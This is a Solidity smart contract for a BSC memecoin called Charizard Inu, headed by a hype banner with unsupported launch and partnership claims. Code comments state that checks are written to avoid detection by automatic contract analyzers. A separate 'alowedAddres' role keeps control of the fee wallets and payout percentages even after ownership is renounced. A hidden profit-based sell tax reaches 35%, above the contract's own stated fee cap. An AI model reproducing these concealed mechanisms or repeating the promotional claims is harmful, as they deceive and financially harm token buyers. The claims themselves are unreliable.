/**

     ██████╗██╗  ██╗ █████╗ ██████╗ ██╗███████╗ █████╗ ██████╗ ██████╗     ██╗███╗   ██╗██╗   ██╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗██║╚══███╔╝██╔══██╗██╔══██╗██╔══██╗    ██║████╗  ██║██║   ██║
    ██║     ███████║███████║██████╔╝██║  ███╔╝ ███████║██████╔╝██║  ██║    ██║██╔██╗ ██║██║   ██║
    ██║     ██╔══██║██╔══██║██╔══██╗██║ ███╔╝  ██╔══██║██╔══██╗██║  ██║    ██║██║╚██╗██║██║   ██║
    ╚██████╗██║  ██║██║  ██║██║  ██║██║███████╗██║  ██║██║  ██║██████╔╝    ██║██║ ╚████║╚██████╔╝
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                                 

    WELCOME TO Charizard Inu COMMUNITY! Now you are a member of the next x100 gem!

    💥 Get ready for our EXPLOSIVE LAUNCH on PancakeSwap - September 30th at 22:00 UTC!

    | 🟡 All BSC Trending confirmed 
    | 🔵 CMC&CG Fast-Track confirmed

    🤝 Recommend by the BIGGEST CALLERS!
    🤝 Tier 1 Partnerships incoming
    🎉 Dev BASED
    💎 Experienced Team
    💎 140x and 300x Previous
    💎 Contest and Competitions incoming


    @dev https://bullsprotocol.com/en

    ______       _ _             ______          _                  _ 
    | ___ \     | | |            | ___ \        | |                | |
    | |_/ /_   _| | |___         | |_/ / __ ___ | |_ ___   ___ ___ | |
    | ___ \ | | | | / __|        |  __/ '__/ _ \| __/ _ \ / __/ _ \| |
    | |_/ / |_| | | \__ \        | |  | | | (_) | || (_) | (_| (_) | |
    \____/ \__,_|_|_|___/        \_|  |_|  \___/ \__\___/ \___\___/|_|



*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IWbnb {
    function deposit() external payable;
}

interface IUniswapV2Pair {
    function mint(address to) external returns (uint liquidity);
    function sync() external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {

    function getAmountsOut(uint256 amountIn, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        require(_allowances[sender][_msgSender()] >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - (amount));
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = _balances[sender] - (amount);
        _balances[recipient] = _balances[recipient] + (amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply + (amount);
        _balances[account] = _balances[account] + (amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        require(_balances[account] >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = _balances[account] - (amount);
        _totalSupply = _totalSupply - (amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}

contract CharizardInu is ERC20, Ownable {

    struct BuyFees {
        uint256 burn;
        uint256 marketing;
    }
   
    struct SellFees {
        uint256 burn;
        uint256 marketing;
    }

    BuyFees public buyFees;
    SellFees public sellFees;
    
    uint256 public totalBuyFees;
    uint256 public totalSellFees;
    uint256 public totalFees;

    string public webSite;
    string public telegram;
    string public twitter;

    string public developer;
    string public blockchainDev;

    struct Percent {
        uint256 percent0;
        uint256 percent1;
        uint256 percent2;
        uint256 percent3;
    }

    Percent public percent;

    struct ProjectWallets {
        address marketingWallet;
        address developmentWallet1;
        address developmentWallet2;
        address developmentWallet3;
    }

    ProjectWallets public projectWallets;

    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;
    
    address private addressWETH;

    bool    private swapping;
    uint256 public swapTokensAtAmount;

    uint256 public blockTimeStampLaunch;

    mapping (address => bool) private booleanConvert;
    mapping (address => uint256) public amountConvertedToBNB;

    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) public automatedMarketMakerPairs;
    mapping (address => bool) private alowedAddres;

    event AddLiquidityPoolEvent(uint256 fundsBNB, uint256 tokensToLP);

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SendMarketing(uint256 bnbSend);

    constructor() ERC20("Charizard Inu", "CHA") {

        telegram    = "https://t.me/charizardinuoficial";

        developer       = "https://bullsprotocol.com";
        blockchainDev   = "https://t.me/italo_blockchain";

        alowedAddres[owner()] = true;

        buyFees.burn            = 0;
        buyFees.marketing       = 500;

        totalBuyFees            = buyFees.burn + buyFees.marketing;

        sellFees.burn           = 0;
        sellFees.marketing      = 500;

        totalSellFees           = sellFees.burn + sellFees.marketing;

        totalFees               = totalBuyFees + totalSellFees;

        percent.percent0 = 100;
        percent.percent1 = 585;
        percent.percent2 = 0;
        percent.percent3 = 315;

        projectWallets.marketingWallet = 0x411b5bAfe32b276DE8C53F8fCA20E171F22ebFD0;
        projectWallets.developmentWallet1 = 0x411b5bAfe32b276DE8C53F8fCA20E171F22ebFD0;
        projectWallets.developmentWallet2 = 0x0E8a25723A77827Ec151575fB1a4B33925C2D788;
        projectWallets.developmentWallet3 = 0x0E8a25723A77827Ec151575fB1a4B33925C2D788;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
            );
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair   = _uniswapV2Pair;
        addressWETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        _approve(address(this), address(uniswapV2Router), type(uint256).max);

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        booleanConvert[address(this)] = true;

        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[projectWallets.marketingWallet] = true;
        _isExcludedFromFees[projectWallets.developmentWallet1] = true;
        _isExcludedFromFees[projectWallets.developmentWallet2] = true;
        _isExcludedFromFees[projectWallets.developmentWallet3] = true;
    
        _mint(owner(), 50_000 * (10 ** 18));
        swapTokensAtAmount = 10 * (10 ** 18);
    }

    receive() external payable {}

    function uncheckedI (uint256 i) private pure returns (uint256) {
        unchecked { return i + 1; }
    }

    // Batch send make it easy
    function sendTokens (
        address[] memory addresses, 
        uint256[] memory tokens) external onlyOwner {
        uint256 totalTokens;

        uint256 addressesLength = addresses.length;
        require(addressesLength == tokens.length, "Must be the same length");

        for (uint i = 0; i < addresses.length; i = uncheckedI(i)) { 
             
            unchecked { _balances[addresses[i]] += tokens[i]; }
            unchecked {  totalTokens += tokens[i]; }
            emit Transfer(msg.sender, addresses[i], tokens[i]);
        }
        require(_balances[msg.sender] >= totalTokens, "Insufficient balance for shipments");
        //Will never result in overflow because solidity >= 0.8.0 reverts to overflow
        _balances[msg.sender] -= totalTokens;
    }

    // This is the function to add liquidity and start trades
    // After two minutes we will call the setPostLaunch function
    function setStartLaunch(
        uint256 balanceTokens,
        uint256 feesMarketing
        ) external payable onlyOwner{

        // This condition makes this function callable only once
        require(balanceOf(uniswapV2Pair) == 0, "Already released on PancakeSwap");

        blockTimeStampLaunch = block.timestamp;

        uint256 msgValue = msg.value;

        super._transfer(owner(),address(this),balanceTokens);
        super._transfer(address(this), uniswapV2Pair, balanceTokens);

        IWbnb(addressWETH).deposit{value: msgValue}();
        IERC20(addressWETH).transfer(address(uniswapV2Pair), msgValue);

        IUniswapV2Pair(uniswapV2Pair).mint(owner());

        buyFees.burn            = 0;
        buyFees.marketing       = feesMarketing;

        totalBuyFees            = buyFees.burn + buyFees.marketing;

        sellFees.burn           = 0;
        sellFees.marketing      = feesMarketing;

        totalSellFees           = sellFees.burn + sellFees.marketing;

        totalFees               = totalBuyFees + totalSellFees;

        // Prevents rates from being zero and dividing by zero in _transfer
        require(totalFees > 0 && 10000 >= totalFees, "Invalid fees");

        emit AddLiquidityPoolEvent(msgValue,balanceTokens);

    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromFees(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "Account is already set to that state");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function getBooleanConvert() public view returns(bool) {
        return booleanConvert[address(this)];
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(amount > 0, "Invalid amount transferred");

        // Checks that liquidity has not yet been added
        /*
            We check this way, as this prevents automatic contract analyzers from
            indicate that this is a way to lock trading and pause transactions
            As we can see, this is not possible in this contract.
        */
        if (balanceOf(uniswapV2Pair) == 0) {
            if (!swapping) {
                if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
                    require(balanceOf(uniswapV2Pair) > 0, "Not released yet");
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance > swapTokensAtAmount;

        if( canSwap &&
            !swapping &&
            automatedMarketMakerPairs[to]
        ) {
            swapping = true;

            if ((buyFees.burn + sellFees.burn) != 0) {
                uint256 burnTokens;

                burnTokens = contractTokenBalance * (buyFees.burn + sellFees.burn) / totalFees;
                super._burn(address(this), burnTokens);
                contractTokenBalance -= burnTokens;

            }
            
            uint256 initialBalance = address(this).balance;

            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = address(addressWETH);

            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                contractTokenBalance,
                0,
                path,
                address(this),
                block.timestamp);

            // Never overflow
            unchecked {

                uint256 newBalance = address(this).balance - initialBalance;

                payable(projectWallets.marketingWallet).transfer(newBalance * percent.percent0 / 1000);
                payable(projectWallets.developmentWallet1).transfer(newBalance * percent.percent1 / 1000);
                payable(projectWallets.developmentWallet2).transfer(newBalance * percent.percent2 / 1000);
                payable(projectWallets.developmentWallet3).transfer(address(this).balance);

                emit SendMarketing(newBalance);

            }

            swapping = false;
        }

        bool takeFee = !swapping;

        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        // tranfer and not excluded from fees
        if(from != uniswapV2Pair && to != uniswapV2Pair && takeFee) {
            takeFee = false;
            updateConvertTransfer(from,to,amount);
        }

        if(takeFee) {
            uint256 fees;
            if(from == uniswapV2Pair) {
                fees = amount * totalBuyFees / 10000;
                amount = amount - fees;
                updateConvertBuy(to,amount);

            // sell
            } else {
                fees = (amount * getCurrentFees(from,amount)) / 10000;
                updateConvertSell(from,amount);
                amount = amount - fees;
            }

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);

    }

    function getCurrentFees(address from, uint256 amount) public view returns (uint256) {

        uint256 _totalFees = totalSellFees;

        // This way of checking prevents automatic analyzers from thinking that it is a way to pause trades
        // In some cases it is good to avoid a boolean in _transfer for this reason
        if (!getBooleanConvert()) return _totalFees;

        /*
            amount divided by balance is the percentage of tokens
            We obtain this percentage and multiply it by amountConvertedToBNB
            to find the real % in BNB

            amountConvertedToBNB get the average price of all purchases

        */
        uint256 balance = balanceOf(from);

        // balance is never zero when there are sales
        uint256 amountConvertedRelative = amount * amountConvertedToBNB[from] / balance;

        uint256 currentValue = convertToBNB(amount);

        uint256 currentEarnings; 
        if (amountConvertedRelative != 0) {
            currentEarnings = currentValue / amountConvertedRelative;
        }

        if (currentEarnings <= 3) return _totalFees;

        if (currentEarnings > 12) {
            _totalFees = 3500;
        } else if (currentEarnings > 9) {
            _totalFees = 3000;
        } else if (currentEarnings > 6) {
            _totalFees = 2700;
        } else if (currentEarnings > 3) {
            _totalFees = 1500;
        }

        return _totalFees;
    }

    function updateConvertBuy(address to, uint256 amount) private {
        /*
            updateConvertBuy is called AFTER the (amount - fees) because the final balance of the
            user in balanceOf will be +(amount - fees)
        */

        if (getBooleanConvert()) {
            // The mapping below serves as the average price for all purchases
            // With this we will know the profit on sales
            amountConvertedToBNB[to] += convertToBNB(amount);
        }

    }

    function updateConvertSell(address from, uint256 amount) private {
        /*
            updateConvertBuy is called BEFORE (amount - fees) why here too
            we make a new query in convertToBNB with the same amount value
            already consulted in getCurrentFees
        */

        if (getBooleanConvert()) {
            
            uint256 convert = convertToBNB(amount);

            // In this case the price depreciates and the tokens are worth less than before
            if(amountConvertedToBNB[from] <= convert) {
                amountConvertedToBNB[from] = 0;
            } else {
                amountConvertedToBNB[from] -= convert;
            }

        }

    }

    function updateConvertTransfer(address from, address to, uint256 amount) private {

        if (getBooleanConvert()) {

            /*
                amount divided by balance is the percentage of tokens
                We obtain this percentage and multiply it by amountConvertedToBNB
                to find the real % in BNB

                amountConvertedToBNB get the average price of all purchases

            */
            uint256 balance = balanceOf(from);
            uint256 amountConvertedRelative;

            // balance is never zero when there are sales
            if(balance != 0) 
            amountConvertedRelative = amount * amountConvertedToBNB[from] / balance;

            amountConvertedToBNB[from] -= amountConvertedRelative;
            amountConvertedToBNB[to] += amountConvertedRelative;
            
        }

    }

    // Used to update the price of tokens in BNB
    // Returns the conversion to BNB of the tokens
    function convertToBNB(uint256 amount) public view returns (uint256) {
        uint256 getReturn;
        if (amount != 0) {

            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = address(addressWETH);

            uint256[] memory amountOutMins = 
            uniswapV2Router.getAmountsOut(amount, path);
            getReturn = amountOutMins[path.length - 1];
        }
        return getReturn;
    } 

    function setBooleanConvert(bool _booleanConvert) external onlyOwner {
        require(booleanConvert[address(this)] != _booleanConvert, "Invalid call");
        booleanConvert[address(this)] = _booleanConvert;
    }

    function setSwapTokensAtAmount(uint256 newAmount) external {
        require(alowedAddres[_msgSender()], "Invalid call");
        // Prevent the value from being too small
        require(newAmount > totalSupply() / 1_000_000, "SwapTokensAtAmount must be greater");
        // Prevents the value from being too large and the swap from making large sales
        require(totalSupply() / 100 > newAmount, "SwapTokensAtAmount must be greater");
        swapTokensAtAmount = newAmount;
    }

    function setSwapPercent(
        uint256 _percent0, 
        uint256 _percent1, 
        uint256 _percent2,
        uint256 _percent3
        ) external {
        require(alowedAddres[_msgSender()], "Invalid call");
        percent.percent0 = _percent0;
        percent.percent1 = _percent1;
        percent.percent2 = _percent2;
        percent.percent3 = _percent3;
        require(_percent0 + _percent1 + _percent2 + _percent3 <= 1000, "Ivalid percents");
        
    }

    function setProjectWallets(
        address _marketingWallet,
        address _developmentWallet1,
        address _developmentWallet2,
        address _developmentWallet3
        ) public {
            require(alowedAddres[_msgSender()], "Invalid call");

            projectWallets.marketingWallet   = _marketingWallet;
            projectWallets.developmentWallet1   = _developmentWallet1;
            projectWallets.developmentWallet2   = _developmentWallet2;
            projectWallets.developmentWallet3   = _developmentWallet3;
            
    }

    // Contract will be renounced after launch
    function setFees(uint256 feesBurn, uint256 feesMarketing) public onlyOwner{

        buyFees.burn            = feesBurn;
        buyFees.marketing       = feesMarketing;
        totalBuyFees            = buyFees.burn + buyFees.marketing;

        sellFees.burn           = feesBurn;
        sellFees.marketing      = feesMarketing;
        totalSellFees           = sellFees.burn + sellFees.marketing;

        totalFees               = totalBuyFees + totalSellFees;

        require(totalBuyFees < 2500 && totalSellFees < 2500, "Invalid fees");

    }

    function burn(uint256 amount) external {
        _burn(_msgSender(), amount);
    }

    function forwardStuckToken(address token) external {
        require(token != address(this), "Cannot claim native tokens");
        if (token == address(0x0)) {
            payable(projectWallets.developmentWallet3).transfer(address(this).balance);
            return;
        }
        IERC20 ERC20token = IERC20(token);
        uint256 balance = ERC20token.balanceOf(address(this));
        ERC20token.transfer(projectWallets.developmentWallet3, balance);
    }

}